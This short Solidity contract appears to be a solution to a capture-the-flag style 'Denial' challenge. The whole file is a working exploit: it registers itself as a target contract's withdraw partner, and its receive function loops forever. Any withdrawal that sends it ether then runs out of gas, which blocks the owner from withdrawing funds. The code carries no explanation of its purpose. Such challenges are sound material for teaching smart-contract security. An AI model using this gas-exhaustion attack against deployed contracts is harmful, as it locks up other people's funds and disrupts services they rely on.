// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract Drain {
    Denial public DenialContract;

    constructor(address payable _DenialContract){
        DenialContract = Denial(_DenialContract);
        DenialContract.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }

}
